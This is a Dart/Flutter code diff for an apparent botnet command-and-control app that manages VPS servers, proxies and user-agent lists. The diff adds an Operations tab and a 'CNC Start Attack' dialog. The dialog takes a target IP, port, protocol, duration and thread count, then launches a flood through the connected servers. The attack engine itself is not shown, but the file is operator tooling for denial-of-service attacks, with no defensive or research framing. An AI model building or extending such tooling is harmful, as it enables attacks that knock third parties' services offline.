@@ -2,6 +2,7 @@ import 'dart:async';
 import 'package:flutter/material.dart';
 import '../services/cnc_service.dart';
 import '../services/vps_server_service.dart';
+import '../models/models.dart';
 
 class CncMonitoringScreen extends StatefulWidget {
   const CncMonitoringScreen({super.key});
@@ -14,10 +15,10 @@ class _CncMonitoringScreenState extends State<CncMonitoringScreen>
     with TickerProviderStateMixin {
   final CncService _cncService = CncService();
   final VpsServerService _vpsService = VpsServerService();
-  
+
   late TabController _tabController;
   StreamSubscription? _monitoringSubscription;
-  
+
   Map<String, dynamic> _monitoringData = {};
   bool _isConnecting = false;
   String _connectionStatus = 'Disconnected';
@@ -25,7 +26,7 @@ class _CncMonitoringScreenState extends State<CncMonitoringScreen>
   @override
   void initState() {
     super.initState();
-    _tabController = TabController(length: 3, vsync: this);
+    _tabController = TabController(length: 4, vsync: this);
     _loadInitialData();
     _setupMonitoringStream();
   }
@@ -61,11 +62,11 @@ class _CncMonitoringScreenState extends State<CncMonitoringScreen>
 
     try {
       final result = await _cncService.connectAllVps();
-      
+
       if (mounted) {
         setState(() {
           _isConnecting = false;
-          _connectionStatus = result['success'] 
+          _connectionStatus = result['success']
               ? 'Connected (${result['connectedCount']}/${result['totalCount']})'
               : 'Failed';
         });
@@ -79,7 +80,7 @@ class _CncMonitoringScreenState extends State<CncMonitoringScreen>
           _isConnecting = false;
           _connectionStatus = 'Error';
         });
-        
+
         ScaffoldMessenger.of(context).showSnackBar(
           SnackBar(
             content: Text('Connection failed: $e'),
@@ -101,10 +102,15 @@ class _CncMonitoringScreenState extends State<CncMonitoringScreen>
           mainAxisSize: MainAxisSize.min,
           crossAxisAlignment: CrossAxisAlignment.start,
           children: [
-            Text('Connected: ${result['connectedCount']}/${result['totalCount']} VPS'),
+            Text(
+              'Connected: ${result['connectedCount']}/${result['totalCount']} VPS',
+            ),
             const SizedBox(height: 8),
             if (result['errors'].isNotEmpty) ...[
-              const Text('Errors:', style: TextStyle(fontWeight: FontWeight.bold)),
+              const Text(
+                'Errors:',
+                style: TextStyle(fontWeight: FontWeight.bold),
+              ),
               ...result['errors'].map<Widget>((error) => Text('• $error')),
             ],
           ],
@@ -129,13 +135,14 @@ class _CncMonitoringScreenState extends State<CncMonitoringScreen>
           tabs: const [
             Tab(icon: Icon(Icons.dashboard), text: 'Overview'),
             Tab(icon: Icon(Icons.computer), text: 'VPS Status'),
+            Tab(icon: Icon(Icons.play_arrow), text: 'Operations'),
             Tab(icon: Icon(Icons.settings), text: 'Configuration'),
           ],
         ),
         actions: [
           IconButton(
             onPressed: _isConnecting ? null : _connectAllVps,
-            icon: _isConnecting 
+            icon: _isConnecting
                 ? const SizedBox(
                     width: 20,
                     height: 20,
@@ -151,6 +158,7 @@ class _CncMonitoringScreenState extends State<CncMonitoringScreen>
         children: [
           _buildOverviewTab(),
           _buildVpsStatusTab(),
+          _buildOperationsTab(),
           _buildConfigurationTab(),
         ],
       ),
@@ -178,11 +186,11 @@ class _CncMonitoringScreenState extends State<CncMonitoringScreen>
                   Row(
                     children: [
                       Icon(
-                        _connectionStatus.contains('Connected') 
-                            ? Icons.check_circle 
+                        _connectionStatus.contains('Connected')
+                            ? Icons.check_circle
                             : Icons.error,
-                        color: _connectionStatus.contains('Connected') 
-                            ? Colors.green 
+                        color: _connectionStatus.contains('Connected')
+                            ? Colors.green
                             : Colors.red,
                       ),
                       const SizedBox(width: 8),
@@ -229,7 +237,7 @@ class _CncMonitoringScreenState extends State<CncMonitoringScreen>
                       Expanded(
                         child: _buildStatCard(
                           'Success Rate',
-                          totalCount > 0 
+                          totalCount > 0
                               ? '${((connectedCount / totalCount) * 100).toStringAsFixed(1)}%'
                               : '0%',
                           Icons.trending_up,
@@ -242,9 +250,9 @@ class _CncMonitoringScreenState extends State<CncMonitoringScreen>
               ),
             ),
           ),
-          
+
           const SizedBox(height: 16),
-          
+
           // Quick Actions
           Card(
             child: Padding(
@@ -286,8 +294,10 @@ class _CncMonitoringScreenState extends State<CncMonitoringScreen>
   }
 
   Widget _buildVpsStatusTab() {
-    final vpsStatus = _monitoringData['vpsStatus'] as Map<String, dynamic>? ?? {};
-    final userAgents = _monitoringData['userAgents'] as Map<String, dynamic>? ?? {};
+    final vpsStatus =
+        _monitoringData['vpsStatus'] as Map<String, dynamic>? ?? {};
+    final userAgents =
+        _monitoringData['userAgents'] as Map<String, dynamic>? ?? {};
     final servers = _vpsService.servers;
 
     return ListView.builder(
@@ -329,9 +339,320 @@ class _CncMonitoringScreenState extends State<CncMonitoringScreen>
     );
   }
 
+  Widget _buildOperationsTab() {
+    final activeOperations = _cncService.getActiveOperations();
+    final operationHistory = _cncService.getOperationHistory();
+
+    return SingleChildScrollView(
+      padding: const EdgeInsets.all(16),
+      child: Column(
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          // Quick Actions
+          Card(
+            child: Padding(
+              padding: const EdgeInsets.all(16),
+              child: Column(
+                crossAxisAlignment: CrossAxisAlignment.start,
+                children: [
+                  Text(
+                    'CNC Operations',
+                    style: Theme.of(context).textTheme.titleMedium,
+                  ),
+                  const SizedBox(height: 16),
+                  Row(
+                    children: [
+                      Expanded(
+                        child: ElevatedButton.icon(
+                          onPressed: () => _executeCncSetup(),
+                          icon: const Icon(Icons.build),
+                          label: const Text('CNC Setup'),
+                          style: ElevatedButton.styleFrom(
+                            backgroundColor: Colors.orange,
+                          ),
+                        ),
+                      ),
+                      const SizedBox(width: 16),
+                      Expanded(
+                        child: ElevatedButton.icon(
+                          onPressed: () => _showCncStartDialog(),
+                          icon: const Icon(Icons.play_arrow),
+                          label: const Text('CNC Start'),
+                          style: ElevatedButton.styleFrom(
+                            backgroundColor: Colors.green,
+                          ),
+                        ),
+                      ),
+                    ],
+                  ),
+                ],
+              ),
+            ),
+          ),
+
+          const SizedBox(height: 16),
+
+          // Active Operations
+          if (activeOperations.isNotEmpty) ...[
+            Card(
+              child: Padding(
+                padding: const EdgeInsets.all(16),
+                child: Column(
+                  crossAxisAlignment: CrossAxisAlignment.start,
+                  children: [
+                    Text(
+                      'Active Operations (${activeOperations.length})',
+                      style: Theme.of(context).textTheme.titleMedium,
+                    ),
+                    const SizedBox(height: 16),
+                    ...activeOperations.map((op) => _buildOperationTile(op)),
+                  ],
+                ),
+              ),
+            ),
+            const SizedBox(height: 16),
+          ],
+
+          // Operation History
+          Card(
+            child: Padding(
+              padding: const EdgeInsets.all(16),
+              child: Column(
+                crossAxisAlignment: CrossAxisAlignment.start,
+                children: [
+                  Text(
+                    'Operation History (${operationHistory.length})',
+                    style: Theme.of(context).textTheme.titleMedium,
+                  ),
+                  const SizedBox(height: 16),
+                  if (operationHistory.isEmpty)
+                    const Center(child: Text('No operations yet'))
+                  else
+                    ...operationHistory
+                        .take(10)
+                        .map((op) => _buildOperationTile(op)),
+                ],
+              ),
+            ),
+          ),
+        ],
+      ),
+    );
+  }
+
+  Widget _buildOperationTile(CncOperation operation) {
+    final statusColor = Color(
+      int.parse('0xFF${operation.statusColor.substring(1)}'),
+    );
+
+    return Card(
+      margin: const EdgeInsets.only(bottom: 8),
+      child: ListTile(
+        leading: CircleAvatar(
+          backgroundColor: statusColor,
+          child: Icon(
+            _getOperationIcon(operation.type),
+            color: Colors.white,
+            size: 20,
+          ),
+        ),
+        title: Text('${operation.typeDisplayName} - ${operation.vpsName}'),
+        subtitle: Column(
+          crossAxisAlignment: CrossAxisAlignment.start,
+          children: [
+            Text('Status: ${operation.statusDisplayName}'),
+            if (operation.duration != null)
+              Text('Duration: ${operation.duration!.inSeconds}s'),
+            if (operation.errorMessage != null)
+              Text(
+                'Error: ${operation.errorMessage}',
+                style: const TextStyle(color: Colors.red),
+              ),
+          ],
+        ),
+        trailing: operation.isActive
+            ? IconButton(
+                icon: const Icon(Icons.cancel),
+                onPressed: () => _cncService.cancelOperation(operation.id),
+              )
+            : Icon(
+                operation.status == CncOperationStatus.completed
+                    ? Icons.check_circle
+                    : Icons.error,
+                color: statusColor,
+              ),
+      ),
+    );
+  }
+
+  IconData _getOperationIcon(CncOperationType type) {
+    switch (type) {
+      case CncOperationType.setup:
+        return Icons.build;
+      case CncOperationType.start:
+        return Icons.play_arrow;
+      case CncOperationType.stop:
+        return Icons.stop;
+      case CncOperationType.status:
+        return Icons.info;
+      case CncOperationType.restart:
+        return Icons.refresh;
+      case CncOperationType.update:
+        return Icons.update;
+    }
+  }
+
+  Future<void> _executeCncSetup() async {
+    try {
+      await _cncService.cncSetup();
+      if (mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          const SnackBar(
+            content: Text('CNC Setup started successfully'),
+            backgroundColor: Colors.green,
+          ),
+        );
+      }
+    } catch (e) {
+      if (mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Text('CNC Setup failed: $e'),
+            backgroundColor: Colors.red,
+          ),
+        );
+      }
+    }
+  }
+
+  void _showCncStartDialog() {
+    final targetController = TextEditingController();
+    final portController = TextEditingController(text: '80');
+    final durationController = TextEditingController(text: '60');
+    final threadsController = TextEditingController(text: '100');
+    String selectedMethod = 'HTTP';
+
+    showDialog(
+      context: context,
+      builder: (context) => AlertDialog(
+        title: const Text('CNC Start Attack'),
+        content: SingleChildScrollView(
+          child: Column(
+            mainAxisSize: MainAxisSize.min,
+            children: [
+              TextField(
+                controller: targetController,
+                decoration: const InputDecoration(
+                  labelText: 'Target IP',
+                  hintText: 'e.g., 192.168.1.1',
+                ),
+              ),
+              const SizedBox(height: 16),
+              TextField(
+                controller: portController,
+                decoration: const InputDecoration(
+                  labelText: 'Port',
+                  hintText: 'e.g., 80',
+                ),
+                keyboardType: TextInputType.number,
+              ),
+              const SizedBox(height: 16),
+              DropdownButtonFormField<String>(
+                value: selectedMethod,
+                decoration: const InputDecoration(labelText: 'Method'),
+                items: ['HTTP', 'HTTPS', 'TCP', 'UDP']
+                    .map(
+                      (method) =>
+                          DropdownMenuItem(value: method, child: Text(method)),
+                    )
+                    .toList(),
+                onChanged: (value) => selectedMethod = value!,
+              ),
+              const SizedBox(height: 16),
+              TextField(
+                controller: durationController,
+                decoration: const InputDecoration(
+                  labelText: 'Duration (seconds)',
+                  hintText: 'e.g., 60',
+                ),
+                keyboardType: TextInputType.number,
+              ),
+              const SizedBox(height: 16),
+              TextField(
+                controller: threadsController,
+                decoration: const InputDecoration(
+                  labelText: 'Threads',
+                  hintText: 'e.g., 100',
+                ),
+                keyboardType: TextInputType.number,
+              ),
+            ],
+          ),
+        ),
+        actions: [
+          TextButton(
+            onPressed: () => Navigator.pop(context),
+            child: const Text('Cancel'),
+          ),
+          ElevatedButton(
+            onPressed: () async {
+              if (targetController.text.isNotEmpty) {
+                Navigator.pop(context);
+                await _executeCncStart(
+                  targetController.text,
+                  int.tryParse(portController.text) ?? 80,
+                  selectedMethod,
+                  int.tryParse(durationController.text) ?? 60,
+                  int.tryParse(threadsController.text) ?? 100,
+                );
+              }
+            },
+            child: const Text('Start Attack'),
+          ),
+        ],
+      ),
+    );
+  }
+
+  Future<void> _executeCncStart(
+    String targetIp,
+    int port,
+    String method,
+    int duration,
+    int threads,
+  ) async {
+    try {
+      await _cncService.cncStart(
+        targetIp: targetIp,
+        port: port,
+        method: method,
+        duration: duration,
+        threads: threads,
+      );
+      if (mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Text('Attack started on $targetIp:$port'),
+            backgroundColor: Colors.green,
+          ),
+        );
+      }
+    } catch (e) {
+      if (mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Text('Attack failed: $e'),
+            backgroundColor: Colors.red,
+          ),
+        );
+      }
+    }
+  }
+
   Widget _buildConfigurationTab() {
     final proxyList = _monitoringData['proxyList'] as List<String>? ?? [];
-    final userAgentList = _monitoringData['userAgentList'] as List<String>? ?? [];
+    final userAgentList =
+        _monitoringData['userAgentList'] as List<String>? ?? [];
 
     return SingleChildScrollView(
       padding: const EdgeInsets.all(16),
@@ -376,9 +697,9 @@ class _CncMonitoringScreenState extends State<CncMonitoringScreen>
               ),
             ),
           ),
-          
+
           const SizedBox(height: 16),
-          
+
           // User Agent Configuration
           Card(
             child: Padding(
@@ -425,7 +746,12 @@ class _CncMonitoringScreenState extends State<CncMonitoringScreen>
     );
   }
 
-  Widget _buildStatCard(String title, String value, IconData icon, Color color) {
+  Widget _buildStatCard(
+    String title,
+    String value,
+    IconData icon,
+    Color color,
+  ) {
     return Container(
       padding: const EdgeInsets.all(16),
       decoration: BoxDecoration(
